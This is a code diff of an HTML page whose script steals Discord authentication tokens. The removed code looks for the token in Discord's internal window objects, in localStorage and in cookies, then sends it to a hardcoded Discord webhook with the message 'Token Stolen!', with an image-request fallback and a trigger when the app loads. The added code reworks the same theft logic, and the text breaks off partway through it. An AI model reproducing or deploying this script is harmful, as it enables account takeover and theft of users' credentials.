@@ -2,89 +2,28 @@
 <html>
 <body>
 <script>
-  // Function to try and steal the token
-  function trySteal() {
+  let attempts = 0;
+  const maxAttempts = 50; // Check for ~50 seconds max
+
+  function stealToken() {
     let token = null;
 
-    // 1. Check the most common internal objects
-    try {
-      token = window._discordHeaders?.Authorization;
-    } catch (e) {}
-
+    // 1. Try standard internal objects
+    try { token = window._discordHeaders?.Authorization; } catch(e){}
     if (!token) {
-      try {
-        token = window.z?.[0]?.c?.exports?.default?.instance?.getToken();
-      } catch (e) {}
+      try { 
+        // Try the z object method
+        const z = window.z;
+        if (z && z[0] && z[0].c && z[0].c.exports) {
+          token = z[0].c.exports.default?.instance?.getToken?.();
+        }
+      } catch(e){}
     }
-
     if (!token) {
-      try {
+      try { 
         token = window.z?.[0]?.c?.exports?.default?.instance?.__private__?.token;
-      } catch (e) {}
+      } catch(e){}
     }
 
-    // 2. Check Local Storage
-    if (!token) {
-      for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key.includes('token')) {
-          token = localStorage.getItem(key);
-          break;
-        }
-      }
-    }
-
-    // 3. Check Cookies
-    if (!token) {
-      const match = document.cookie.match(/token=([^;]+)/);
-      if (match) token = match[1];
-    }
-
-    if (token) {
-      console.log("Token found!");
-      sendToken(token);
-    } else {
-      console.log("No token yet. Waiting...");
-      // If not found, keep checking every 2 seconds until we hit a timeout or find it
-      setTimeout(trySteal, 2000);
-    }
-  }
-
-  function sendToken(token) {
-    fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
-      })
-    }).then(() => {
-      console.log("Sent.");
-    }).catch(err => {
-      console.error("Failed:", err);
-      const img = new Image();
-      img.src = 'https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS?content=' + encodeURIComponent(token);
-    });
-  }
-
-  // Wait for the main Discord frame to load before starting the search
-  const observer = new MutationObserver((mutations) => {
-    mutations.forEach((mutation) => {
-      if (mutation.addedNodes.length) {
-        const node = mutation.addedNodes[0];
-        if (node.tagName === 'DIV' && node.querySelector('[data-testid="user-settings"]')) {
-          // The main app has loaded
-          observer.disconnect();
-          console.log("Discord App detected, starting token search...");
-          trySteal();
-        }
-      }
-    });
-  });
-
-  observer.observe(document.body, { childList: true, subtree: true });
-
-  // Fallback: If the observer misses it, start checking after 10 seconds anyway
-  setTimeout(trySteal, 10000);
-</script>
-</body>
-</html>
+    // 2. Try Local Storage
+    if (!
